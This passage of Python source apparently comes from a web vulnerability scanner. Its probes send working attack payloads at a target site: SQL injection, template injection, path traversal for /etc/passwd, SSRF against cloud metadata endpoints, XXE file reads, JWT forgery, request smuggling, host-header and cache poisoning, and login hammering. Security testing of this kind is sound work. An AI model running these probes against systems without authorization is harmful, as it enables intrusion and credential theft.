                    try:
                        self._get(parsed.path + "?" + urllib.parse.urlencode(tp))
                    except Exception:
                        pass
                    elapsed = time.time() - t0
                    if elapsed >= threshold:
                        ident = f"time:{url}:{key}"
                        if ident not in seen:
                            seen.add(ident)
                            entry = {"url": url, "parameter": key,
                                     "type": "time-based-blind",
                                     "db": db, "delay_s": round(elapsed, 2)}
                            vulnerable.append(entry)
                            print(f"  \033[38;5;196m[SQLI-BLIND-TIME]\033[0m "
                                  f"{url} param={key} db={db} delay={elapsed:.1f}s")
                        break

        self.results["sqli_blind"] = vulnerable
        return vulnerable

    # ── UNION-based SQLi ─────────────────────────────────────────────────────

    def sqli_union_test(self) -> list[dict]:
        """
        Finds column count via ORDER BY binary search, then injects
        UNION SELECT NULL,NULL,... with a canary string per position.
        """
        urls = self._collect_param_urls()
        vulnerable: list[dict] = []
        seen: set = set()

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            for key in params:
                col_count = None
                for n in range(1, 11):
                    tp = params.copy(); tp[key] = f"1 ORDER BY {n}--"
                    try:
                        r    = self._get(parsed.path + "?" + urllib.parse.urlencode(tp))
                        body = self._text(r).lower()
                        if any(e in body for e in ["error", "unknown column",
                                                    "order by", "invalid"]):
                            col_count = n - 1
                            break
                    except Exception:
                        break
                if not col_count or col_count < 1:
                    continue
                for pos in range(1, col_count + 1):
                    cols = ["NULL"] * col_count
                    cols[pos - 1] = "'LGHTSCAN'"
                    tp = params.copy()
                    tp[key] = f"0 UNION SELECT {','.join(cols)}--"
                    try:
                        r = self._get(parsed.path + "?" + urllib.parse.urlencode(tp))
                        if "LGHTSCAN" in self._text(r):
                            ident = f"union:{url}:{key}"
                            if ident not in seen:
                                seen.add(ident)
                                entry = {"url": url, "parameter": key,
                                         "type": "union-based",
                                         "columns": col_count,
                                         "injectable_pos": pos}
                                vulnerable.append(entry)
                                print(f"  \033[38;5;196m[SQLI-UNION]\033[0m "
                                      f"{url} param={key} cols={col_count} pos={pos}")
                            break
                    except Exception:
                        continue

        self.results["sqli_union"] = vulnerable
        return vulnerable

    # ── SSTI ─────────────────────────────────────────────────────────────────

    def ssti_test(self) -> list[dict]:
        """
        Server-Side Template Injection — math canary per engine.
        Jinja2/Twig: {{7*7}}→49  Freemarker: ${7*7}→49
        Spring EL: #{7*7}→49    ERB: <%=7*7%>→49
        Jinja2 confirm: {{7*'7'}}→7777777
        """
        PROBES = [
            ("{{7*7}}",       "49",      "Jinja2/Twig/Pebble"),
            ("${7*7}",        "49",      "Freemarker/Spring EL"),
            ("#{7*7}",        "49",      "Thymeleaf"),
            ("<%= 7*7 %>",    "49",      "ERB/EJS"),
            ("*{7*7}",        "49",      "Spring EL"),
            ("{{7*'7'}}",     "7777777", "Jinja2-confirm"),
            ("${{7*7}}",      "49",      "Pebble"),
            ("[[${7*7}]]",    "49",      "Thymeleaf-inline"),
            ("{7*7}",         "49",      "Smarty/generic"),
            ("@(7*7)",        "49",      "Razor"),
        ]
        urls = self._collect_param_urls()
        form_targets = self._collect_form_targets()
        vulnerable: list[dict] = []
        seen: set = set()

        def _probe(url, params, method="GET"):
            parsed = urllib.parse.urlparse(url)
            for key in params:
                for payload, expected, engine in PROBES:
                    tp = params.copy(); tp[key] = payload
                    try:
                        if method == "POST":
                            r = self._post(url, tp, allow_redirects=True)
                        else:
                            r = self._get(parsed.path + "?" +
                                          urllib.parse.urlencode(tp))
                        if expected in self._text(r):
                            ident = f"ssti:{url}:{key}"
                            if ident not in seen:
                                seen.add(ident)
                                entry = {"url": url, "parameter": key,
                                         "payload": payload, "engine": engine,
                                         "method": method}
                                vulnerable.append(entry)
                                print(f"  \033[38;5;196m[SSTI]\033[0m "
                                      f"{url} param={key} engine={engine}")
                            break
                    except Exception:
                        continue

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            _probe(url, dict(urllib.parse.parse_qsl(parsed.query)), "GET")
        for t in form_targets:
            _probe(t["url"], {f: "test" for f in t["fields"]}, t["method"])

        self.results["ssti"] = vulnerable
        return vulnerable

    # ── LFI / Path Traversal ─────────────────────────────────────────────────

    def lfi_test(self) -> list[dict]:
        """
        Local File Inclusion — tests file/path params with:
        plain traversal, URL-encoded, double-encoded, null byte, php://filter.
        Targets: /etc/passwd, win.ini, php source.
        """
        INDICATORS = [
            "root:x:0:0",
            "[boot loader]",
            "for 16-bit app support",
            "<?php",
            "[global]",
            "[fonts]",
        ]
        PAYLOADS = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "../../../windows/win.ini",
            "../../../../windows/win.ini",
            "/windows/win.ini",
            "C:\\Windows\\win.ini",
        ]
        FILE_HINTS = {"file","path","page","include","doc","dir","filepath",
                      "filename","read","load","template","view","lang",
                      "locale","content","module","src","source","resource"}

        urls = self._collect_param_urls()
        vulnerable: list[dict] = []
        seen: set = set()

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            targets = {k: v for k, v in params.items()
                       if k.lower() in FILE_HINTS} or params
            for key in targets:
                for payload in PAYLOADS:
                    tp = params.copy(); tp[key] = payload
                    try:
                        r    = self._get(parsed.path + "?" +
                                         urllib.parse.urlencode(tp))
                        body = self._text(r)
                        for ind in INDICATORS:
                            if ind.lower() in body.lower():
                                ident = f"lfi:{url}:{key}"
                                if ident not in seen:
                                    seen.add(ident)
                                    entry = {"url": url, "parameter": key,
                                             "payload": payload, "indicator": ind}
                                    vulnerable.append(entry)
                                    print(f"  \033[38;5;196m[LFI]\033[0m "
                                          f"{url} param={key} → {ind[:30]}")
                                break
                        if f"lfi:{url}:{key}" in seen:
                            break
                    except Exception:
                        continue

        self.results["lfi"] = vulnerable
        return vulnerable

    # ── SSRF ─────────────────────────────────────────────────────────────────

    def ssrf_test(self) -> list[dict]:
        """
        Server-Side Request Forgery — probes URL/fetch params.
        Tests cloud metadata endpoints, localhost ports, file://, dict://.
        Blind detection via timing (fast localhost response).
        """
        URL_HINTS = {"url","uri","redirect","next","dest","target","link",
                     "src","source","ref","callback","fetch","load","img",
                     "image","path","proxy","webhook","endpoint","service"}
        PAYLOADS = [
            ("http://169.254.169.254/latest/meta-data/",   ["ami-id","instance-id"]),
            ("http://metadata.google.internal/",            ["computeMetadata"]),
            ("http://169.254.169.254/metadata/v1/",        ["droplet_id","interfaces"]),
            ("http://127.0.0.1/",                          ["html","DOCTYPE"]),
            ("http://localhost/",                           ["html","DOCTYPE"]),
            ("http://0.0.0.0/",                            []),
            ("http://127.0.0.1:22/",                       ["SSH-"]),
            ("http://127.0.0.1:6379/",                     ["redis_version","+OK"]),
            ("http://127.0.0.1:3306/",                     ["mysql","MariaDB"]),
            ("file:///etc/passwd",                          ["root:x:0:0"]),
            ("dict://127.0.0.1:6379/info",                 ["redis_version"]),
        ]
        urls = self._collect_param_urls()
        vulnerable: list[dict] = []
        seen: set = set()

        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            targets = {k: v for k, v in params.items()
                       if k.lower() in URL_HINTS}
            if not targets:
                continue
            for key in targets:
                for payload, indicators in PAYLOADS:
                    tp = params.copy(); tp[key] = payload
                    t0 = time.time()
                    try:
                        r    = self._get(parsed.path + "?" +
                                         urllib.parse.urlencode(tp))
                        elapsed = time.time() - t0
                        body    = self._text(r)
                        for ind in indicators:
                            if ind in body:
                                ident = f"ssrf:{url}:{key}:{payload[:20]}"
                                if ident not in seen:
                                    seen.add(ident)
                                    entry = {"url": url, "parameter": key,
                                             "payload": payload,
                                             "indicator": ind, "type": "direct"}
                                    vulnerable.append(entry)
                                    print(f"  \033[38;5;196m[SSRF]\033[0m "
                                          f"{url} param={key} → {ind}")
                                break
                        # Blind: localhost responds fast
                        if "127.0.0.1" in payload and elapsed < 0.3:
                            ident = f"ssrf-blind:{url}:{key}"
                            if ident not in seen:
                                seen.add(ident)
                                entry = {"url": url, "parameter": key,
                                         "payload": payload,
                                         "type": "blind-fast-response",
                                         "delay_s": round(elapsed, 3)}
                                vulnerable.append(entry)
                                print(f"  \033[38;5;196m[SSRF-BLIND]\033[0m "
                                      f"{url} param={key} fast={elapsed:.3f}s")
                    except Exception:
                        continue

        self.results["ssrf"] = vulnerable
        return vulnerable

    # ── XXE ──────────────────────────────────────────────────────────────────

    def xxe_test(self) -> list[dict]:
        """
        XML External Entity — finds XML-accepting endpoints (by Content-Type
        or form file-upload fields), injects classic, Windows, error-based payloads.
        """
        XXE_PAYLOADS = [
            ("classic",
             '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
             ["root:x:0:0", "nobody:"]),
            ("win",
             '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///C:/Windows/win.ini">]><r>&x;</r>',
             ["[fonts]", "for 16-bit"]),
            ("error-based",
             '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY % x SYSTEM "file:///etc/passwd">%x;]><r/>',
             ["root:x:", "SYSTEM"]),
        ]
        endpoints: list[dict] = []
        for path in ("/", "/api/", "/api/v1/", "/upload", "/xml", "/soap",
                     "/ws", "/webservice", "/xmlrpc.php"):
            r  = self._get(path)
            ct = self._headers(r).get("Content-Type","")
            if "xml" in ct.lower() or "soap" in ct.lower():
                endpoints.append({"url": urllib.parse.urljoin(
                    self.base_url+"/", path.lstrip("/")), "method": "POST"})

        soup = self._parse_html(self._text(self._get("/")))
        if soup:
            for form in soup.find_all("form"):
                action = form.get("action") or "/"
                url    = urllib.parse.urljoin(self.base_url+"/", action.lstrip("/"))
                if any((i.get("type","")).lower()=="file"
                       for i in form.find_all("input")):
                    endpoints.append({"url": url, "method": "POST"})

        if not endpoints:
            endpoints.append({"url": self.base_url+"/", "method": "POST"})

        vulnerable: list[dict] = []
        seen: set = set()

        for ep in endpoints:
            for xxe_type, payload, indicators in XXE_PAYLOADS:
                try:
                    if self._use_requests:
                        r    = self.session.post(ep["url"], data=payload.encode(),
                                                 headers={"Content-Type":"application/xml"},
                                                 timeout=self.timeout, verify=False)
                        body = r.text
                    else:
                        req = urllib.request.Request(
                            ep["url"], data=payload.encode(),
                            headers={"Content-Type":"application/xml"}, method="POST")
                        ctx = __import__("ssl").create_default_context()
                        ctx.check_hostname = False; ctx.verify_mode = 0
                        with urllib.request.urlopen(req, timeout=self.timeout,
                                                    context=ctx) as r:
                            body = r.read(8192).decode("utf-8","replace")
                    for ind in indicators:
                        if ind in body:
                            ident = f"xxe:{ep['url']}:{xxe_type}"
                            if ident not in seen:
                                seen.add(ident)
                                entry = {"url": ep["url"], "type": xxe_type,
                                         "indicator": ind}
                                vulnerable.append(entry)
                                print(f"  \033[38;5;196m[XXE]\033[0m "
                                      f"{ep['url']} type={xxe_type}")
                            break
                except Exception:
                    continue

        self.results["xxe"] = vulnerable
        return vulnerable

    # ── Advanced JWT ─────────────────────────────────────────────────────────

    def jwt_advanced_test(self) -> list[dict]:
        """
        • alg:none variants (none/None/NONE/nOnE)
        • Weak HS256 secret brute (30 common secrets)
        • kid SQL injection + path traversal (sign with empty key)
        • Expired token acceptance
        • jku header injection pointing to localhost JWKS
        """
        import hmac as _hmac, hashlib as _hl

        token = self._discover_jwt()
        if not token:
            return []
        parts = token.split(".")
        if len(parts) != 3:
            return []

        def _b64d(s): return base64.urlsafe_b64decode(s + "==")
        def _b64e(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")

        try:
            header  = json.loads(_b64d(parts[0]))
            payload = json.loads(_b64d(parts[1]))
        except Exception:
            return []

        findings: list[dict] = []
        seen: set = set()
        PRIV_PATHS = ["/admin","/api/admin","/dashboard","/api/user/me"]

        def _probe(forged: str, technique: str) -> bool:
            for ep in PRIV_PATHS:
                r = self._get(ep, headers={"Authorization": f"Bearer {forged}"})
                if self._status(r) == 200:
                    ident = f"jwt-adv:{technique}:{ep}"
                    if ident not in seen:
                        seen.add(ident)
                        findings.append({"technique": technique, "endpoint": ep})
                        print(f"  \033[38;5;196m[JWT-ADV]\033[0m "
                              f"{technique} accepted @ {ep}")
                    return True
            return False

        # alg:none
        for alg_val in ("none","None","NONE","nOnE"):
            fh = _b64e(json.dumps({"alg": alg_val, "typ": "JWT"}).encode())
            _probe(f"{fh}.{parts[1]}.", f"alg:{alg_val}")

        # Weak secret
        COMMON = ["secret","password","123456","qwerty","jwt_secret",
                  "supersecret","changeme","admin","key","mysecret",
                  "jwtkey","secretkey","private","token","signing-key",
                  "shared-secret","secret_key","secret123","password123",
                  "test","example","hello","world","app_secret","jwt-secret-key",
                  "my_secret_key","jwt_signing_key","access_token","hs256secret",
                  "your-256-bit-secret","default"]
        if header.get("alg","").startswith("HS"):
            for secret in COMMON:
                sig = _hmac.new(secret.encode(),
                    f"{parts[0]}.{parts[1]}".encode(), _hl.sha256).digest()
                if _b64e(sig) == parts[2]:
                    findings.append({"technique":"weak-secret","secret":secret})
                    print(f"  \033[38;5;196m[JWT-ADV]\033[0m "
                          f"Weak secret: {secret!r}")
                    break

        # kid injection
        for kid in ("' UNION SELECT 'ls'--", "../../dev/null", "/dev/null"):
            nh = dict(header); nh["kid"] = kid
            fh = _b64e(json.dumps(nh).encode())
            sig = _hmac.new(b"", f"{fh}.{parts[1]}".encode(), _hl.sha256).digest()
            _probe(f"{fh}.{parts[1]}.{_b64e(sig)}", f"kid-inject:{kid[:15]}")

        # Expired token acceptance
        try:
            pm = dict(payload); pm["exp"] = 1
            fp = _b64e(json.dumps(pm).encode())
            _probe(f"{parts[0]}.{fp}.{parts[2]}", "expired-accepted")
        except Exception: pass

        # jku injection
        try:
            nh = dict(header); nh["jku"] = "http://127.0.0.1:8080/jwks.json"
            fh = _b64e(json.dumps(nh).encode())
            _probe(f"{fh}.{parts[1]}.{parts[2]}", "jku-injection")
        except Exception: pass

        self.results["jwt_advanced"] = findings
        return findings

    # ── GraphQL ───────────────────────────────────────────────────────────────

    def graphql_test(self) -> dict:
        """
        Discovers GraphQL endpoint → introspection → batch queries →
        field suggestions leak → XSS in error response → alias-based DoS probe.
        """
        GQL_PATHS = ["/graphql","/api/graphql","/graph","/gql",
                     "/api/gql","/v1/graphql","/query"]
        endpoint = None
        for path in GQL_PATHS:
            r    = self._get(path)
            body = self._text(r)
            if any(k in body for k in ("__typename","graphql","\"data\"","\"errors\"")):
                endpoint = path; break

        if not endpoint:
            self.results["graphql"] = {"found": False}
            return {"found": False}

        result: dict = {"found":True,"endpoint":endpoint,"introspection":False,
                        "batch":False,"injection":False,"findings":[]}

        def _gql(query_or_list):
            payload = json.dumps(query_or_list if isinstance(query_or_list,list)
                                 else {"query": query_or_list}).encode()
            try:
                if self._use_requests:
                    r = self.session.post(self.base_url+endpoint, data=payload,
                        headers={"Content-Type":"application/json"},
                        timeout=self.timeout, verify=False)
                    return r.status_code, r.text
                else:
                    req = urllib.request.Request(self.base_url+endpoint, data=payload,
                        headers={"Content-Type":"application/json"}, method="POST")
                    ctx = __import__("ssl").create_default_context()
                    ctx.check_hostname=False; ctx.verify_mode=0
                    with urllib.request.urlopen(req, timeout=self.timeout,
                                                context=ctx) as r:
                        return r.status, r.read(16384).decode("utf-8","replace")
            except Exception:
                return 0, ""

        # Introspection
        sc, body = _gql("{ __schema { types { name } } }")
        if "__schema" in body:
            result["introspection"] = True
            result["findings"].append("introspection_enabled")
            result["types"] = list(set(
                re.findall(r'"name"\s*:\s*"([A-Za-z][A-Za-z0-9_]*)"', body)))[:20]
            print(f"  \033[38;5;196m[GQL]\033[0m Introspection @ {endpoint}")

        # Batch
        sc2, body2 = _gql([{"query":"{ __typename }"},{"query":"{ __typename }"}])
        if "__typename" in body2 and "[" in body2:
            result["batch"] = True
            result["findings"].append("batch_queries_enabled")
            print(f"  \033[38;5;196m[GQL]\033[0m Batch queries enabled")

        # XSS in error
        sc3, body3 = _gql('{ a:__typename @deprecated(reason:"<script>alert(1)</script>") }')
        if "<script>" in body3:
            result["injection"] = True
            result["findings"].append("xss_in_error_response")
            print(f"  \033[38;5;196m[GQL]\033[0m XSS in error response")

        # Field suggestions (schema leak)
        sc4, body4 = _gql("{ userz { id } }")
        if "Did you mean" in body4 or "suggestion" in body4.lower():
            result["findings"].append("field_suggestion_leak")
            m = re.search(r'Did you mean "([^"]+)"', body4)
            if m: result["suggested_field"] = m.group(1)
            print(f"  \033[38;5;196m[GQL]\033[0m Field suggestion leaks schema")

        self.results["graphql"] = result
        return result

    # ── HTTP Method Enumeration ───────────────────────────────────────────────

    def http_methods_test(self) -> dict:
        """
        Tests OPTIONS Allow header + active TRACE (XST) + PUT probe.
        TRACE canary: inject X-LightScan-Trace header, check echo.
        PUT: upload probe file, verify 201/200, then DELETE.
        """
        DANGEROUS = {
            "TRACE":  "Cross-Site Tracing (XST) — cookie theft via JS",
            "PUT":    "Arbitrary file upload / overwrite",
            "DELETE": "Resource deletion",
            "CONNECT":"Proxy tunneling",
            "PATCH":  "Partial write access",
        }
        results: dict = {"allowed":[],"dangerous":{}}

        try:
            if self._use_requests:
                r = self.session.options(self.base_url+"/", timeout=self.timeout,
                                         verify=False)
                allow = r.headers.get("Allow","") or r.headers.get("Public","")
            else:
                req = urllib.request.Request(self.base_url+"/", method="OPTIONS")
                req.add_header("User-Agent","Mozilla/5.0")
                ctx = __import__("ssl").create_default_context()
                ctx.check_hostname=False; ctx.verify_mode=0
                with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as r:
                    allow = r.headers.get("Allow","")
            results["allow_header"] = allow
            for m in DANGEROUS:
                if m in allow.upper():
                    results["dangerous"][m] = DANGEROUS[m]
                    print(f"  \033[38;5;196m[METHOD]\033[0m {m} in Allow header")
        except Exception: pass

        # Active TRACE probe
        try:
            if self._use_requests:
                r = self.session.request("TRACE", self.base_url+"/",
                    timeout=self.timeout, verify=False,
                    headers={"X-LightScan-Trace":"canary123"})
                if r.status_code == 200 and "canary123" in r.text:
                    results["dangerous"]["TRACE"] = DANGEROUS["TRACE"]
                    print(f"  \033[38;5;196m[METHOD]\033[0m TRACE enabled (XST)")
        except Exception: pass

        # PUT probe
        try:
            if self._use_requests:
                r = self.session.put(self.base_url+"/ls_probe.txt", data=b"probe",
                                     timeout=self.timeout, verify=False)
                if r.status_code in (200,201,204):
                    results["dangerous"]["PUT"] = DANGEROUS["PUT"]
                    print(f"  \033[38;5;196m[METHOD]\033[0m PUT enabled ({r.status_code})")
                    try: self.session.delete(self.base_url+"/ls_probe.txt",
                                             timeout=2, verify=False)
                    except Exception: pass
        except Exception: pass

        self.results["http_methods"] = results
        return results

    # ── HTTP Request Smuggling Probe ──────────────────────────────────────────

    def smuggling_probe(self) -> dict:
        """
        Raw socket CL.TE + TE.CL probes.
        Heuristic: status code differential or >3s timeout on one probe.
        """
        import socket as _sock
        parsed  = urllib.parse.urlparse(self.base_url)
        host    = parsed.hostname or "localhost"
        port    = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_tls = parsed.scheme == "https"
        result  = {"tested":False,"cl_te":False,"te_cl":False}

        def _raw(payload: bytes) -> tuple[float, bytes]:
            t0 = time.time()
            data = b""
            try:
                s = _sock.create_connection((host, port), timeout=5)
                if use_tls:
                    ctx = __import__("ssl").create_default_context()
                    ctx.check_hostname=False; ctx.verify_mode=0
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.sendall(payload)
                while True:
                    c = s.recv(4096)
                    if not c: break
                    data += c
                    if len(data) > 8192: break
                s.close()
            except Exception: pass
            return time.time() - t0, data

        cl_te = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                 f"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n"
                 f"\r\n0\r\n\r\nX").encode()
        te_cl = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                 f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n"
                 f"\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n"
                 f"\r\nx=1\r\n0\r\n\r\n").encode()
        try:
            result["tested"] = True
            t1, r1 = _raw(cl_te);  t2, r2 = _raw(te_cl)
            s1 = int(r1[9:12]) if r1[:4]==b"HTTP" and len(r1)>12 else 0
            s2 = int(r2[9:12]) if r2[:4]==b"HTTP" and len(r2)>12 else 0
            if (s1==400 and s2==200) or (s1==200 and s2==400):
                result["cl_te"] = True
                result["finding"] = f"Status diff CL.TE:{s1} TE.CL:{s2}"
                print(f"  \033[38;5;196m[SMUGGLE]\033[0m "
                      f"Possible desync CL.TE:{s1} TE.CL:{s2}")
            if t1 > 3.5:
                result["cl_te"] = True
                result["finding"] = f"CL.TE timeout {t1:.1f}s"
                print(f"  \033[38;5;196m[SMUGGLE]\033[0m CL.TE timeout {t1:.1f}s")
            if t2 > 3.5:
                result["te_cl"] = True
                result["finding"] = f"TE.CL timeout {t2:.1f}s"
                print(f"  \033[38;5;196m[SMUGGLE]\033[0m TE.CL timeout {t2:.1f}s")
        except Exception as e:
            result["error"] = str(e)

        self.results["smuggling"] = result
        return result

    # ── Host Header Injection ─────────────────────────────────────────────────

    def host_header_injection_test(self) -> list[dict]:
        """
        Injects evil canary via Host / X-Forwarded-Host / X-Host /
        X-Forwarded-Server on password-reset + home paths.
        Checks reflection in body, Location header, and all response headers.
        """
        CANARY = "evil-lightscan.com"
        INJECT_HEADERS = [
            {"Host":               CANARY},
            {"X-Forwarded-Host":   CANARY},
            {"X-Host":             CANARY},
            {"X-Forwarded-Server": CANARY},
            {"X-Original-Host":    CANARY},
        ]
        PATHS = ["/", "/reset-password", "/forgot-password",
                 "/account/password-reset", "/api/password-reset"]
        findings: list[dict] = []
        seen: set = set()
        for path in PATHS:
            for hdr_dict in INJECT_HEADERS:
                hdr_name = next(iter(hdr_dict))
                try:
                    r    = self._get(path, headers=hdr_dict)
                    body = self._text(r)
                    hdrs = self._headers(r)
                    reflected_in = None
                    if CANARY in body:
                        reflected_in = "body"
                    elif CANARY in hdrs.get("Location",""):
                        reflected_in = "redirect"
                    elif any(CANARY in str(v) for v in hdrs.values()):
                        reflected_in = "response-header"
                    if reflected_in:
                        ident = f"host:{path}:{hdr_name}"
                        if ident not in seen:
                            seen.add(ident)
                            findings.append({"path":path,"header":hdr_name,
                                             "reflected_in":reflected_in})
                            print(f"  \033[38;5;196m[HOST-INJECT]\033[0m "
                                  f"{hdr_name} reflected in {reflected_in} @ {path}")
                except Exception: continue
        self.results["host_header"] = findings
        return findings

    # ── Rate Limit Detection ──────────────────────────────────────────────────

    def rate_limit_test(self) -> dict:
        """
        Sends 20 rapid POST requests to the first accessible login endpoint.
        Detects: HTTP 429, Retry-After header, CAPTCHA, lockout messages.
        """
        LOGIN_PATHS = ["/login","/api/login","/user/login","/auth/login",
                       "/signin","/api/signin","/api/auth/login"]
        LOCKOUT_WORDS = ["locked","too many","rate limit","try again",
                          "captcha","temporarily","blocked"]
        result = {"tested":False,"protected":False,"path":None,
                  "mechanism":None,"lockout_after":None}

        for path in LOGIN_PATHS:
            if self._status(self._get(path)) != 200: continue
            result["tested"] = True
            for i in range(20):
                try:
                    r    = self._post(path, {"username":"probe","password":f"x{i}","login":"1"})
                    sc   = self._status(r)
                    body = self._text(r).lower()
                    hdrs = self._headers(r)
                    if sc == 429:
                        result.update({"protected":True,"mechanism":"HTTP-429",
                                        "lockout_after":i+1,"path":path,
                                        "retry_after":hdrs.get("Retry-After")})
                        print(f"  \033[38;5;196m[RATE-LIMIT]\033[0m "
                              f"429 after {i+1} req @ {path}")
                        break
                    for word in LOCKOUT_WORDS:
                        if word in body:
                            result.update({"protected":True,"mechanism":"lockout-msg",
                                           "lockout_after":i+1,"path":path,
                                           "indicator":word})
                            print(f"  \033[38;5;196m[RATE-LIMIT]\033[0m "
                                  f"Lockout '{word}' after {i+1} req @ {path}")
                            break
                    if result["protected"]: break
                except Exception: continue
            if not result["protected"] and result["tested"]:
                result["mechanism"] = "none-detected"
                result["path"]      = path
                print(f"  \033[38;5;196m[RATE-LIMIT]\033[0m "
                      f"No rate limiting @ {path} after 20 req")
            break

        self.results["rate_limit"] = result
        return result

    # ── Cache Poisoning Probe ─────────────────────────────────────────────────

    def cache_poison_test(self) -> list[dict]:
        """
        Injects unkeyed headers, checks reflection, then sends clean request
        to see if response is cached with injected value.
        Headers: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL,
                 X-Forwarded-Scheme, X-HTTP-Method-Override.
        """
        CANARY  = "ls-cache-probe"
        UNKEYED = {
            "X-Forwarded-Host":      f"{CANARY}.com",
            "X-Original-URL":        f"/{CANARY}",
            "X-Rewrite-URL":         f"/{CANARY}",
            "X-Forwarded-Scheme":    CANARY,
            "X-HTTP-Method-Override":"DELETE",
        }
        findings: list[dict] = []
        seen: set = set()
        for hdr_name, hdr_val in UNKEYED.items():
            try:
                r1   = self._get("/", headers={hdr_name: hdr_val})
                body1= self._text(r1); hdrs1 = self._headers(r1)
                if not (CANARY in body1 or
                        CANARY in hdrs1.get("Location","") or
                        any(CANARY in str(v) for v in hdrs1.values())):
                    continue
                # Check if stored in cache
                r2      = self._get("/")
                poisoned= CANARY in self._text(r2)
                ident   = f"cache:{hdr_name}"
                if ident not in seen:
                    seen.add(ident)
                    findings.append({"header":hdr_name,"value":hdr_val,
                                     "reflected":True,"cache_stored":poisoned})
                    status = "STORED" if poisoned else "reflected-not-cached"
                    print(f"  \033[38;5;196m[CACHE-POISON]\033[0m "
                          f"{hdr_name} → {status}")
            except Exception: continue
        self.results["cache_poison"] = findings
        return findings

    # ── API Endpoint Discovery ────────────────────────────────────────────────

    def api_discovery_test(self) -> list[dict]:
        """
        Discovers REST API endpoints + probes HTTP methods on each.
        Sources: common paths, JS file analysis, sitemap/robots.
        """
        API_PATHS = [
            "/api","/api/v1","/api/v2","/api/v3",
            "/v1","/v2","/rest","/api/users","/api/admin",
            "/api/auth","/api/token","/api/login",
            "/swagger.json","/openapi.json","/api-docs",
            "/swagger/v1/swagger.json",
            "/.well-known/openid-configuration",
        ]
        found: list[dict] = []
        seen: set = set()

        # Probe known paths
        for path in API_PATHS:
            r  = self._get(path)
            sc = self._status(r)
            if sc and sc < 400:
                ct   = self._headers(r).get("Content-Type","")
                body = self._text(r)
                entry = {"path":path,"status":sc,"content_type":ct}
                # If it's OpenAPI/Swagger, extract defined routes
                if "swagger" in body.lower() or "openapi" in body.lower():
                    try:
                        spec   = json.loads(body)
                        routes = list((spec.get("paths") or {}).keys())[:20]
                        entry["swagger_routes"] = routes
                    except Exception: pass
                found.append(entry)
                seen.add(path)
                print(f"  \033[38;5;196m[API]\033[0m {path} [{sc}]")

        # Mine JS files for /api/ paths
        resp = self._get("/")
        soup = self._parse_html(self._text(resp))
        if soup:
            for tag in soup.find_all("script", src=True)[:8]:
                src = tag["src"]
                if not src.startswith("http"):
                    src = urllib.parse.urljoin(self.base_url+"/", src.lstrip("/"))
                try:
                    js = self._text(self._get(src))
                    for m in re.finditer(r'["\`](/(?:api|v\d)[/\w\-{}:]+)["\`]', js):
                        p = m.group(1)
                        if p not in seen:
                            r2 = self._get(p)
                            sc2= self._status(r2)
                            if sc2 and sc2 < 400:
                                found.append({"path":p,"status":sc2,
                                              "source":"js-extract"})
                                seen.add(p)
                                print(f"  \033[38;5;196m[API]\033[0m "
                                      f"{p} [{sc2}] (from JS)")
                except Exception: pass

        self.results["api_endpoints"] = found
        return found

    # ── WordPress Plugin / Theme Enumeration ──────────────────────────────────

    def cms_plugin_enum(self) -> list[dict]:
        """
        WordPress-specific: enumerates plugins and themes via
        /wp-content/plugins/<name>/readme.txt version extraction.
        Uses a curated list of 40 high-prevalence plugins.
        """
        cms = self.results.get("cms", {})
        if cms.get("name","").lower() not in ("wordpress",""):
            # Still try — might be WP without meta generator
            pass

        WP_PLUGINS = [
            "woocommerce","contact-form-7","yoast-seo","elementor",
            "wordfence","akismet","wpforms-lite","really-simple-ssl",
            "mailchimp-for-wp","jetpack","all-in-one-seo-pack",
            "updraftplus","wp-super-cache","w3-total-cache","wp-rocket",
            "duplicate-post","classic-editor","gutenberg","tinymce-advanced",
            "advanced-custom-fields","wordpress-seo","redirection",
            "wp-optimize","imagify","smush","cloudflare","bbpress",
            "buddypress","wc-stripe","easy-digital-downloads",
            "gravity-forms","ninja-forms","give","the-events-calendar",
            "tablepress","user-role-editor","members","loginizer",
            "all-in-one-wp-migration","wp-migrate-db",
        ]
        WP_THEMES = [
            "twentytwentyfour","twentytwentythree","twentytwentytwo",
            "twentytwentyone","twentytwenty","astra","divi","hello-elementor",
            "oceanwp","generatepress","storefront","flatsome",
        ]
        found: list[dict] = []

        for plugin in WP_PLUGINS:
            path = f"/wp-content/plugins/{plugin}/readme.txt"
            r    = self._get(path)
            if self._status(r) == 200:
                body = self._text(r)
                version = None
                m = re.search(r"Stable tag:\s*([\d.]+)", body, re.I)
                if m: version = m.group(1)
                entry = {"type":"plugin","name":plugin,"version":version}
                found.append(entry)
                print(f"  \033[38;5;196m[WP-PLUGIN]\033[0m "
                      f"{plugin} v{version or '?'}")

        for theme in WP_THEMES:
            path = f"/wp-content/themes/{theme}/style.css"
            r    = self._get(path)
            if self._status(r) == 200:
                body    = self._text(r)
                version = None
                m = re.search(r"Version:\s*([\d.]+)", body, re.I)
                if m: version = m.group(1)
                found.append({"type":"theme","name":theme,"version":version})
                print(f"  \033[38;5;196m[WP-THEME]\033[0m "
                      f"{theme} v{version or '?'}")

        self.results["cms_plugins"] = found
        return found

    # ── Parameter Pollution ───────────────────────────────────────────────────

    def param_pollution_test(self) -> list[dict]:
